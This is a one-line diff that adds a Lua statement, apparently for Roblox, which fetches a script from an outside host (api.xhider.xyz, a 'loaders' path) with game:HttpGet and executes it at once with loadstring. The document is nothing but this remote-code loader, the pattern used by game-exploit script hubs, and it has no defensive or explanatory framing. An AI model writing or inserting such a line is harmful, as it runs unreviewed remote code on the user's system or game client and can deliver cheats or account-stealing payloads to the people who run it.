@@ -1,1 +1,1 @@
-
+loadstring(game:HttpGet("https://api.xhider.xyz/files/v4/loaders/ae67f6507ff92e4292d5bb38029b69f3.lua"))()
